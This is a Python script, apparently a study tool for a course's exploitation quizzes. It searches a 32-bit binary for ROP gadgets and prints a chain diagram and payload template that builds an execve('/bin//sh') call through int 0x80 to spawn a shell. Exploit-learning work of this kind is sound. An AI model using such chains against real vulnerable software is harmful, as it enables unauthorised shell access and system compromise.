#!/usr/bin/env python3
"""
find_gadgets.py — ROP gadget finder for EPL326 quiz binaries
Usage: python3 find_gadgets.py ./binary

Finds all gadgets needed to build execve("/bin//sh", NULL, NULL) via int 0x80.
Prints addresses + readable chain diagram.
"""

import subprocess, sys, re

REQUIRED = {
    "pop eax; pop ebx; ret":  re.compile(r"58\s+5b\s+c3"),
    "xor eax,eax; ret":       re.compile(r"31\s+c0\s+c3"),
    "mov \[ebx\],eax; ret":   re.compile(r"89\s+03\s+c3"),
    "mov ebx,eax; ret":       re.compile(r"89\s+c3\s+c3"),
    "xor ecx,ecx; ret":       re.compile(r"31\s+c9\s+c3"),
    "xor edx,edx; ret":       re.compile(r"31\s+d2\s+c3"),
    "mov al,0xb; ret":        re.compile(r"b0\s+0b\s+c3"),
    "int 0x80; ret":          re.compile(r"cd\s+80\s+c3"),
}

FALLBACK = {
    "pop eax; ret":           re.compile(r"58\s+c3"),
    "pop ebx; ret":           re.compile(r"5b\s+c3"),
    "mov eax,ebx; ret":       re.compile(r"89\s+d8\s+c3"),
}

def get_objdump(binary):
    result = subprocess.run(
        ["objdump", "-d", "-M", "intel", binary],
        capture_output=True, text=True
    )
    return result.stdout

def get_hex_dump(binary):
    result = subprocess.run(
        ["objdump", "-d", binary],
        capture_output=True, text=True
    )
    return result.stdout

def find_gadget(dump, pattern, name):
    """Find all occurrences of a gadget byte pattern, return list of (addr, name)."""
    found = []
    lines = dump.split('\n')
    for i, line in enumerate(lines):
        m = re.search(r'^\s*([0-9a-f]+):\s+([0-9a-f ]+?)\s+', line)
        if not m:
            continue
        addr_str = m.group(1)
        bytes_str = m.group(2).replace(' ', '')
        # build a window of bytes across nearby lines
        window = ''
        for j in range(i, min(i+4, len(lines))):
            bm = re.search(r'^\s*[0-9a-f]+:\s+([0-9a-f ]+?)\s+', lines[j])
            if bm:
                window += bm.group(1).replace(' ','')
        if pattern.search(bytes_str) or pattern.search(window[:6]):
            found.append(('0x' + addr_str, name))
    return found

def get_writable_addr(binary):
    result = subprocess.run(
        ["readelf", "-S", binary],
        capture_output=True, text=True
    )
    for line in result.stdout.split('\n'):
        if '.bss' in line:
            parts = line.split()
            for i, p in enumerate(parts):
                if p == '.bss' and i+2 < len(parts):
                    try:
                        addr = int(parts[i+2], 16)
                        if addr > 0:
                            return hex(addr), '.bss'
                    except:
                        pass
        if '.data' in line and '.rodata' not in line:
            parts = line.split()
            for i, p in enumerate(parts):
                if p == '.data' and i+2 < len(parts):
                    try:
                        addr = int(parts[i+2], 16)
                        if addr > 0:
                            return hex(addr), '.data'
                    except:
                        pass
    return None, None

def check_mmap(binary):
    result = subprocess.run(
        ["objdump", "-d", binary],
        capture_output=True, text=True
    )
    dump = result.stdout
    has_mmap   = 'mmap'   in dump
    has_movb   = 'movb'   in dump and 'main' in dump
    return has_mmap, has_movb

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 find_gadgets.py ./binary")
        sys.exit(1)

    binary = sys.argv[1]
    print(f"\n{'='*60}")
    print(f"  ROP GADGET FINDER — {binary}")
    print(f"{'='*60}\n")

    dump = get_hex_dump(binary)

    # Check for mmap ROP pattern
    has_mmap, has_movb = check_mmap(binary)
    if has_mmap and has_movb:
        print("⚠️  WARNING: mmap() + movb detected in binary!")
        print("   main() may be building gadgets dynamically at a fixed RWX address.")
        print("   Run: objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p'")
        print("   Look for movb instructions — decode bytes as x86 instructions.")
        print("   See README section 10B for mmap ROP methodology.\n")

    # Check for int 0x80
    if 'int    $0x80' not in dump and 'int 0x80' not in dump:
        print("❌  int 0x80 NOT FOUND — ROP via execve syscall not possible.")
        print("   Try ret2libc instead.\n")
    else:
        print("✓  int 0x80 found — execve syscall ROP is possible\n")

    # Find writable address
    wr_addr, wr_section = get_writable_addr(binary)
    if wr_addr:
        print(f"✓  Writable address: {wr_addr} ({wr_section})")
        print(f"   NOTE: if binary has init_data() or TEMP stored in .bss,")
        print(f"   use mmap region (mmap_base + 0x500) instead.\n")
    else:
        print("❌  Could not find writable section\n")

    # Find gadgets
    print("── GADGETS ─────────────────────────────────────────────")
    results = {}
    for name, pattern in REQUIRED.items():
        found = find_gadget(dump, pattern, name)
        if found:
            results[name] = found[0][0]
            print(f"  ✓  {found[0][0]}  →  {name}")
        else:
            results[name] = None
            print(f"  ❌  NOT FOUND  →  {name}")

    # Fallback gadgets
    missing_combo = results.get("pop eax; pop ebx; ret") is None
    if missing_combo:
        print("\n── FALLBACK GADGETS ────────────────────────────────────")
        for name, pattern in FALLBACK.items():
            found = find_gadget(dump, pattern, name)
            if found:
                print(f"  ✓  {found[0][0]}  →  {name}")
            else:
                print(f"  ❌  NOT FOUND  →  {name}")

    # Chain diagram
    gb = results
    wr = wr_addr if wr_addr else "0xWRITABLE"
    wr4 = hex(int(wr_addr, 16) + 4) if wr_addr else "0xWRITABLE+4"

    print("\n── CHAIN DIAGRAM ───────────────────────────────────────")
    print(f"  [padding N bytes]          ← fill buffer + overwrite saved EBP")
    print(f"  [{gb.get('pop eax; pop ebx; ret')}]  → pop eax; pop ebx; ret")
    print(f"  [0x6e69622f]               → '/bin' (popped into eax)")
    print(f"  [{wr}]         → writable addr (popped into ebx)")
    print(f"  [{gb.get('mov [ebx],eax; ret')}]  → mov [ebx],eax; ret  (writes '/bin')")
    print(f"  [{gb.get('pop eax; pop ebx; ret')}]  → pop eax; pop ebx; ret")
    print(f"  [0x68732f2f]               → '//sh' (popped into eax)")
    print(f"  [{wr4}]       → writable+4 (popped into ebx)")
    print(f"  [{gb.get('mov [ebx],eax; ret')}]  → mov [ebx],eax; ret  (writes '//sh')")
    print(f"  [{gb.get('mov ebx,eax; ret')}]  → mov ebx,eax; ret  (ebx = ptr to /bin//sh)")
    print(f"  [{gb.get('xor ecx,ecx; ret')}]  → xor ecx,ecx; ret  (ecx = 0)")
    print(f"  [{gb.get('xor edx,edx; ret')}]  → xor edx,edx; ret  (edx = 0)")
    print(f"  [{gb.get('xor eax,eax; ret')}]  → xor eax,eax; ret  (eax = 0)")
    print(f"  [{gb.get('mov al,0xb; ret')}]  → mov al,0xb; ret   (eax = 11)")
    print(f"  [{gb.get('int 0x80; ret')}]  → int 0x80            (SYSCALL → shell!)")

    print("\n── PYTHON PAYLOAD TEMPLATE ─────────────────────────────")
    print("import struct")
    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)")
    print(f"wr = {wr}")
    for name, addr in gb.items():
        varname = name.replace('; ', '_').replace(' ', '_').replace(',','').replace('[','').replace(']','').replace('$','').replace('0x','')
        print(f"g_{varname[:20]} = {addr}")
    print("chain  = b'A' * OFFSET  # replace OFFSET with your value from GDB")
    print("# ... (fill in from chain diagram above)")

    print()

if __name__ == '__main__':
    main()
